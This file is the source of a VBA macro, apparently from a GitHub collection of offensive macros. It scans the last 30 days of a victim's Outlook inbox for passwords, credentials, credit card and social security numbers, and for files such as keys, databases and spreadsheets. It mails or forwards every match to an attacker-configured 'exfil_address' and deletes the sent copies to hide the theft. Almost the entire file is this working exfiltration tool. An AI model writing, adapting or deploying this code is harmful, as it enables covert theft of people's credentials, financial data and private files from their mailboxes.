' Source: https://github.com/JohnWoodman/VBA-Macro-Projects
'This VBA parses Outlook, searches for sensitive keywords 
'and file extensions, exfils the data via email, and then 
'deletes the sent emails.

'Author: John Woodman
'Twitter: @JohnWoodman15

'Variable exfil_address is the email address that 
'the parsed emails are sent to.
Const exfil_address As String = "ChangeMe@gmail.com"

'The variable daysToSearch determines how many days 
'worth of emails to look through. It's currently set 
'to parse the last 30 days of emails.
Const daysToSearch As Integer = 30
    
Sub parse_outlook()
    'This function loops through Outlook inbox and calls 
    'functions to parse inbox for keywords and extensions.
    
    'These are the keywords and file extensions that 
    'are searched for in the emails and attachments.
    Dim keywords
    keywords = Array( _
        "password", _
        "passwd", _
        "creds", _
        "credential", _
        "credit card", _
        "creditcard", _
        "social security number" _
    )
    
    Dim extensions
    extensions = Array( _
        "pgp", _
        "asc", _
        "pem", _
        "pub", _
        "gpg", _
        "gpg-key", _
        "mp3", _
        "mp4", _
        "mov", _
        "xlsx", _
        "xlsm", _
        "xlsb", _
        "csv", _
        "doc", _
        "docx", _
        "docm", _
        "exe", _
        "zip", _
        "sql", _
        "db", _
        "bak", _
        "pdf" _
    )

    Dim xOutApp As Object
    Dim xOutMail As Object
    Dim xMailBody As String
    Dim outlNameSpace As Object
    Dim myTasks As Object
    Set xOutApp = CreateObject("Outlook.Application")
    Set outlNameSpace = xOutApp.GetNamespace("MAPI")

    Set myTasks = outlNameSpace.GetDefaultFolder(6).Items
    Dim i As Integer
    
    Dim found As Boolean
    found = False
    Dim found2 As Boolean
    found2 = False
    
    Dim afterDate As Date
    Dim beforeDate As Date
    afterDate = Date - daysToSearch
    beforeDate = Date
    
    Dim OlMail As Object
    For Each OlMail In myTasks
        If OlMail.ReceivedTime >= afterDate And OlMail.ReceivedTime <= beforeDate Then
            found = parse_body(OlMail.body, OlMail.subject, keywords)
            If found Then
                Call send_mail(OlMail.body, OlMail.subject)
            End If
            
            If OlMail.Attachments.Count > 0 Then
                Dim j As Integer
                For j = 1 To OlMail.Attachments.Count
                    found2 = parse_attachment(OlMail.Attachments.Item(j), extensions, keywords)
                    If found2 Then
                        Call send_attach(OlMail, OlMail.subject)
                    End If
                Next
            End If
            
        End If
    Next
    
    Set xOutMail = Nothing
    Set xOutApp = Nothing
End Sub

Sub send_mail(body As String, subject As String)
    'This function sends the body of the email containing 
    'the keyword to the specified email address.
    
    Dim xOutApp As Object
    Dim xOutMail As Object
    Dim xMailBody As String
    
    Set xOutApp = CreateObject("Outlook.Application")
    Set xOutMail = xOutApp.CreateItem(0)
    xMailBody = body
    
    On Error Resume Next
    With xOutMail
        .To = exfil_address
        .CC = ""
        .BCC = ""
        .subject = "Outlook Exfiltration Data from User: " & Environ("username")
        .body = subject & xMailBody
        .DeleteAfterSubmit = True
        .Send
    End With
    On Error GoTo 0
    
    Set xOutMail = Nothing
    Set xOutApp = Nothing
End Sub

Sub send_attach(OlMail As Variant, subject As String)
    'This function forwards the email containing 
    'the attachment to the specified email address.
    
    Dim xOutMail As Object
    Set xOutMail = OlMail.Forward
    
    On Error Resume Next
    With xOutMail
        .To = exfil_address
        .CC = ""
        .BCC = ""
        .subject = "Outlook Exfiltration Attachment from User: " & Environ("username")
        .DeleteAfterSubmit = True
        .Send
    End With
    On Error GoTo 0
    
    Set xOutMail = Nothing
End Sub


Public Function parse_body(body As String, subject As String, keywords As Variant) As Boolean
    'This function parses the body and subject 
    'of the email, searching for the provided keywords.
    
    parse_body = False
    
    Dim k As Variant
    For Each k In keywords
        If (InStr(1, UCase(body), k, vbTextCompare) > 0) Or (InStr(1, UCase(subject), k, vbTextCompare) > 0) Then
            parse_body = True
            Exit For
        Else
            parse_body = False
        End If
    Next
End Function


Public Function parse_attachment(attachment As Variant, extensions As Variant, keywords As Variant) As Boolean
    'This function parses the attachments of the 
    'email and searches for the provided keywords 
    'and extensions.
    
    parse_attachment = False
    
    Dim found_ext As Boolean
    found_ext = False
    
    Dim found_keyword As Boolean
    found_keyword = False
    
    Dim attachName As String
    Dim extension As String
    attachName = attachment.FileName
    extension = Split(attachName, ".")(1)
    
    Dim ext As Variant
    For Each ext In extensions
        If (InStr(1, UCase(extension), ext, vbTextCompare) > 0) Then
            found_ext = True
        Else
            found_ext = False
        End If
    Next
    
    Dim k As Variant
    For Each k In keywords
        If (InStr(1, UCase(attachName), k, vbTextCompare) > 0) Then
            found_keyword = True
        Else
            found_keyword = False
        End If
    Next
    
    If found_ext Or found_keyword Then
        parse_attachment = True
    Else
        parse_attachment = False
    End If
End Function
